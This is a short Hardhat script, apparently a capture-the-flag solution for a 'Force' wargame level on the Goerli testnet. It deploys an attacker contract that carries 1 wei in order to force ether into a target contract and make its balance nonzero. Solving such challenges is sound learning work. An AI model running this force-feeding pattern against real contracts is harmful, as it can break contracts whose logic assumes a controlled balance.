import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "Force"
const CONTRACT_ADDRESS = "0x0e5F1765980F8f3772a404d799B98Bb9a12d43d2"
const CONTRACT_NAME_ATTACKER = "ForceAttacker"

async function main() {
    const force = await ethers.getContractFactory(CONTRACT_NAME)
    const contract = force.attach(CONTRACT_ADDRESS)

    const attackerForce = await ethers.getContractFactory(CONTRACT_NAME_ATTACKER)
    const attackerContract = await attackerForce.connect(attacker).deploy(
        CONTRACT_ADDRESS, 
        { value: 1 }
    )
    await attackerContract.deployed()

    console.log("Force: made the balance of the contract greater than zero");
    console.log(await ethers.provider.getBalance(contract.address))
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });